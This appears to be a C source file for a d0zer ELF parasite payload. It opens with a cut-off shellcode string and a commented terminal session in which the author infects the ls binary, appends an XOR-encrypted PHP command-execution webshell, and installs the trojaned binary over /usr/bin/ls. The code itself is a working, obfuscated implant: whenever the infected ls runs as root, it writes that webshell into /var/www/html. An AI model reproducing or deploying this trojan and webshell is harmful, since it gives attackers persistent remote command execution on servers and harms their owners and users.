x73\x6e\x62\x2e\x72\x64\x48\x89\x45\xd1\x48\xb8\x64\x6d\x67\x2e\x64\x79\x64\x00\x48\x89\x45\xd8\x48\x8d\x45\xd1\x48\x89\xc7\xe8\x9d\xfe\xff\xff\x48\x83\xc0\x01\x48\x89\x45\xf8\x48\x8b\x45\xf8\x48\x89\xc7\xe8\xb9\xfe\xff\xff\x48\x89\x45\xf0\xbf\x00\x10\x00\x00\xe8\xab\xfe\xff\xff\x48\x89\x45\xe8\x48\x83\x7d\xe8\x00\x74\x3d\x48\x8b\x55\xf0\x48\x8d\x45\xd1\x48\x89\xd6\x48\x89\xc7\xe8\xc7\xfa\xff\xff\x48\x8b\x4d\xe8\x48\x8b\x45\xf0\xba\x00\x10\x00\x00\x48\x89\xce\x48\x89\xc7\xe8\x7a\x01\x00\x00\x48\x89\x45\xe0\x48\x8b\x55\xe8\x48\x8b\x45\xe0\x48\x01\xd0\xc6\x00\x00\x48\x8b\x55\xf8\x48\x8b\x45\xf0\x48\x89\xd6\x48\x89\xc7\xe8\x01\x01\x00\x00\x48\x8b\x45\xe8\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x89\x75\xe4\x89\x55\xe0\x48\xc7\xc0\x02\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe4\x48\x8b\x55\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x01\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x00\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\xc7\xc0\x03\x00\x00\x00\x48\x8b\x7d\xec\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x89\x55\xdc\x89\x4d\xd8\x44\x89\x45\xd4\x4c\x89\x4d\xc8\x48\xc7\xc0\x09\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x48\x8b\x55\xdc\x4c\x8b\x55\xd8\x4c\x8b\x45\xd4\x4c\x8b\x4d\xc8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\xc7\xc0\x0b\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\xc7\xc0\x04\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x59\x00\x00\x00\x48\x8b\x7d\xe8\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x89\x75\xe4\x48\xc7\xc0\x15\x00\x00\x00\x48\x8b\x7d\xe8\x48\xc7\xc6\x01\x00\x00\x00\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x48\xc7\xc0\x6b\x00\x00\x00\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3"
[sad0p@arch-deliberate d0zer-payloads]$ #run d0zer with the appropriate infection algorithm, we are using the default vanilla TextSegmentPadding Algorithm with original entry-point modification
[sad0p@arch-deliberate d0zer-payloads]$ #we will be targetting the ls command that I have already copied into this directory
[sad0p@arch-deliberate d0zer-payloads]$ ~/go/src/github.com/d0zer/d0zer -target ./ls -payloadEnv DOZEREGG
[sad0p@arch-deliberate d0zer-payloads]$ #resulting infected binary will have -infected appended to it (original binary is preserved)
[sad0p@arch-deliberate d0zer-payloads]$ #now we use a script that carries out XOR encryption of the webshell then appends it to the target binary, the infected binary is programmed to read itself to look for a script
[sad0p@arch-deliberate d0zer-payloads]$ #the same key in the script is used in the source for d0zer-webv1.c
[sad0p@arch-deliberate d0zer-payloads]$ cat embed-webshell.py
#!/usr/bin/env python3

import sys

def main():
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} <script> <target-binary>")
        sys.exit(1)

    scriptPath = sys.argv[1]
    targetPath = sys.argv[2]

    xorKey = 0x01

    with open(scriptPath, "rb") as sHandle:
        e_script = sHandle.read()
        with open(targetPath, "ab") as tHandle:
            for b in e_script:
                encryptedByte = b ^ xorKey
                tHandle.write(encryptedByte.to_bytes(1, byteorder="little"))


if __name__ == "__main__":
    main()
[sad0p@arch-deliberate d0zer-payloads]$ ./embed-webshell.py
./embed-webshell.py <script> <target-binary>
[sad0p@arch-deliberate d0zer-payloads]$ #our php webshell
[sad0p@arch-deliberate d0zer-payloads]$ cat webshell.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
[sad0p@arch-deliberate d0zer-payloads]$ ./embed-webshell.py ./webshell.php ./ls-infected
[sad0p@arch-deliberate d0zer-payloads]$ #now we copy it into /usr/bin to replace the clean version of the ls command
[sad0p@arch-deliberate d0zer-payloads]$ sudo cp ./ls-infected  /usr/bin/ls
[sudo] password for sad0p:
[sad0p@arch-deliberate d0zer-payloads]$ #we now verify nothing is in the /var/www/html directory
[sad0p@arch-deliberate d0zer-payloads]$ ls /var/www/html
[sad0p@arch-deliberate d0zer-payloads]$ #anytime the ls command is executed as root, the webshell will be written to /var/www/html directory
[sad0p@arch-deliberate d0zer-payloads]$ sudo ls /
bin  boot  dev	etc  home  lib	lib64  lost+found  mnt	opt  proc  root  run  sbin  srv  sys  tmp  usr	var
[sad0p@arch-deliberate d0zer-payloads]$ #lets see if our webshell is there
[sad0p@arch-deliberate d0zer-payloads]$ ls -l /var/www/html
total 4
-rwxr-xr-x 1 root root 301 Oct 11 21:29 en-us.php
[sad0p@arch-deliberate d0zer-payloads]$ cat /var/www/html/en-us.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
[sad0p@arch-deliberate d0zer-payloads]$ #done :=)
*/

#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <linux/limits.h>

#define XOR_KEY 0x01

long __open(const char *pathname, int flags, int mode);
long __write(int fd, const void *buf, size_t count);
long __read(int fd, void *buf, size_t count);
long __close(int fd);
void *__mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
long __munmap(void *addr, size_t len);
long __stat(const char *path, struct stat *f_info);
long __readlink(const char *path, const char *buf, size_t size);
long __access(const char *path, int mode);
long __geteuid();

size_t __strlen(const char *s);
void *__malloc(size_t len);
void __strncpy(char *restrict dest, const char *src, size_t n);

extern unsigned long end_vx;
void real_start();

void decrypt_xor(char *encrypted_str, char *decrypted_str);
char *get_self_path();
char *create_full_path(char *directory, char *filename);

void write_payload(void *self_mem, uint64_t p_offset, uint64_t p_size);

void __attribute__((naked)) _start()
{
	real_start();
	__asm__ __volatile__("jmp end_code");
}


void real_start()
{
	int self_fd = -1;
	uint64_t f_end;
	struct stat f_info;
	void *self_mem = NULL;
	char *self_path = NULL;

	Elf64_Ehdr *e_hdr;
	if(__geteuid())
		return;
	if((self_path = get_self_path()) == NULL)
		return;

	if((self_fd = __open(self_path, O_RDONLY,0)) < 0 )
		goto clean_up;

	if(__stat(self_path, &f_info) < 0)
		goto clean_up;

	if((self_mem = __malloc(f_info.st_size)) == NULL)
		goto clean_up;

	if(__read(self_fd, self_mem, f_info.st_size) != f_info.st_size)
		goto clean_up;

	e_hdr = (Elf64_Ehdr*)self_mem;

	/*
		If the st_size is equal to the calculated size of the file based on
	    the presumption that the structure header table is at the end of the file
	    then we will know that there is not an embedded configuration, so we
	    exit and transfer control back to the original program.
	*/

	f_end = e_hdr->e_shoff + (e_hdr->e_shnum * e_hdr->e_shentsize);
	if(f_info.st_size == f_end)
		goto clean_up;

	write_payload(self_mem, f_end, f_info.st_size - f_end);
	clean_up:
		if(self_fd > 0)
			__close(self_fd);
		if(self_path != NULL)
			__munmap(self_path, PATH_MAX);
		if(self_mem != NULL)
			__munmap(self_mem, f_info.st_size);

}

void decrypt_xor(char *encrypted_str, char *decrypted_str)
{
	uint8_t key = XOR_KEY;
	char *d_ptr = decrypted_str;
	while(*encrypted_str != '\0')
		*d_ptr++ = *encrypted_str++ ^ key;
	*d_ptr = '\0';
}

#define ENC_TARGET_DIR ".w`s.vvv.iulm"
#define TARGET_DIR_LEN __strlen(ENC_TARGET_DIR) + 1

#define ENC_FILENAME "do,tr/qiq"
#define FILENAME_LEN __strlen(ENC_FILENAME) + 1

void write_payload(void *self_mem, uint64_t  p_offset, uint64_t p_size)
{
	int fd = -1;
	char *webshell = NULL;
	char *full_path = NULL;
	char d_directory[TARGET_DIR_LEN];
	char d_fname[FILENAME_LEN];
	char enc_target_dir[] = ENC_TARGET_DIR;
	char enc_filename[] = ENC_FILENAME;

	decrypt_xor(enc_target_dir, d_directory);
	decrypt_xor(enc_filename, d_fname);
	full_path = create_full_path(d_directory, d_fname);
	if(full_path == NULL)
		goto end;
	if(__access(full_path, F_OK) == 0)
		goto end;
	if((webshell = __malloc(p_size)) == NULL)
		goto end;

	__strncpy(webshell, (char *)(self_mem + p_offset), p_size);
	for(int i = 0; i < p_size; i++)
		webshell[i] = webshell[i] ^ XOR_KEY;

	if((fd = __open(full_path, O_CREAT | O_WRONLY, 0755)) < 0)
		goto end;

	__write(fd, webshell, p_size);

	end:
	if (fd > 0)
		__close(fd);
	if(full_path != NULL)
		__munmap(full_path, __strlen(full_path));
	if(webshell != NULL)
		__munmap(webshell, p_size);

}

char *create_full_path(char *directory, char *filename)
{
	char *absolute_path;
	size_t filename_len = __strlen(filename);
	size_t dir_len = __strlen(directory);
	size_t allocatation_size  = __strlen(directory) + filename_len;

	// 1 byte for null terminator and 1 byte for '/' appended to directory
	allocatation_size += 2;
	if((absolute_path = __malloc(allocatation_size)) == NULL)
		return NULL;

	__strncpy(absolute_path, directory, allocatation_size);

	absolute_path[dir_len++] = '/';
	__strncpy(absolute_path + dir_len, filename, filename_len);
	absolute_path[allocatation_size] = '\0';

	return absolute_path;
}

size_t __strlen(const char *s)
{
	size_t len = 0;
	while(*s++ != '\0')
		len++;

	return len;
}

void *__malloc(size_t len)
{
	void *mem;
	mem = __mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	return mem;
}

void __strncpy(char *restrict dest, const char *src, size_t n)
{
	while(n-- && *src != '\0')
		*dest++ = *src++;
	*dest  = '\0';
}

int __strncmp(const char *s1, const char *s2, size_t n)
{
	int diff = 0;
	for(size_t i = 0; i < n; i++) {
		diff = (unsigned char)(*s1++) - (unsigned char)(*s2++);
		if(diff != 0 || *s1 == '\0')
			break;
	}
	return diff;
}

char *get_self_path()
{
	size_t path_len;
	size_t proc_path_len;
	char encrypted_proc_slash_self_exe[] = ".qsnb.rdmg.dyd";
	proc_path_len = __strlen(encrypted_proc_slash_self_exe) + 1;
	char *proc_slash_self_exe = __malloc(proc_path_len);
	char *self_path_buf = __malloc(PATH_MAX);

	if(self_path_buf) {
		decrypt_xor(encrypted_proc_slash_self_exe, proc_slash_self_exe);
		path_len = __readlink(proc_slash_self_exe, self_path_buf, PATH_MAX);
		self_path_buf[path_len] = '\0';
	}
	__munmap(proc_slash_self_exe, proc_path_len);
	return self_path_buf;
}

#define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));

#define __open_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $2, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __write_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
	{ \
		type ret; \
		__asm__ __volatile__ (\
				"movq $1, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
           			      : \
				      : "g" (arg1), "g" (arg2), "g" (arg3) \
				      : "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __read_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
	{ \
		type ret; \
		__asm__ __volatile__ (\
				"movq $0, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
					: \
					: "g" (arg1), "g" (arg2), "g" (arg3) \
					: "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __close_syscall(type, name, arg1, arg1_type) \
        type name(arg1_type arg1) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $3, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1) \
                                        : "%rax", "%rdi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __mmap_syscall(type, name, arg1, arg1_type, arg2,  arg2_type, arg3, arg3_type, arg4, arg4_type, arg5, arg5_type, arg6, arg6_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3, arg4_type arg4, arg5_type arg5, arg6_type arg6) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $9, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "movq %3, %%r10\n" \
                                "movq %4, %%r8\n" \
                                "movq %5, %%r9\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3), "g" (arg4), "g" (arg5), "g" (arg6) \
                                        : "%rax", "%rdi", "%rsi", "%rdx", "%r10", "%r8", "%r9" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __munmap_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $11, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __stat_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $4, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __readlink_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
		type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__( \
                				"movq $89, %%rax\n" \
                				"movq %0, %%rdi\n" \
                				"movq %1, %%rsi\n" \
                				"movq %2, %%rdx\n" \
                				"syscall" \
                				: \
                				: "g" (arg1), "g" (arg2), "g" (arg3) \
                				: "%rax", "%rdi", "%rsi", "%rdx" \
        		); \
        		__load_syscall_ret(ret); \
        		return ret; \
        }

#define __access_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
	type name(arg1_type arg1, arg2_type arg2) { \
		type ret; \
        __asm__ __volatile__( \
						"movq $21, %%rax\n" \
						"movq %0, %%rdi\n" \
						"movq $1, %%rsi\n" \
						"syscall" \
						: \
						: "g" (arg1), "g" (arg2) \
						: "%rax", "%rdi", "%rsi" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __geteuid_syscall(type, name) \
	type name() { \
    type ret; \
	__asm__ __volatile__( \
    				"movq $107, %%rax\n" \
					"syscall" \
					: \
					: \
					: "%rax" \
	); \
    __load_syscall_ret(ret); \
	return ret; \
}

__open_syscall(long, __open, pathname, const char *, flags, int, mode, int);
__write_syscall(long, __write, fd, int, buf, const void *, count, size_t);
__read_syscall(long, __read, fd, int, buf, void *, count, size_t);
__close_syscall(long, __close, fd, int);
__mmap_syscall(void *, __mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
__munmap_syscall(long, __munmap, addr, void *, len, size_t);
__stat_syscall(long, __stat, path, const char *, f_info, struct stat *);
__readlink_syscall(long, __readlink, pathname, const char *restrict, buf, const char *restrict, size, size_t);
__access_syscall(long, __access, pathname, const char *, mode, int);
__geteuid_syscall(long, __geteuid);

/*
 * No additional code beyond end_code(), d0zer appends a restoration stub here, unless you handle restoration
 * (transfering execution back to the non-parasitic code) with -noRestoration flag in d0zer.
 */
__attribute__((naked)) void end_code() {}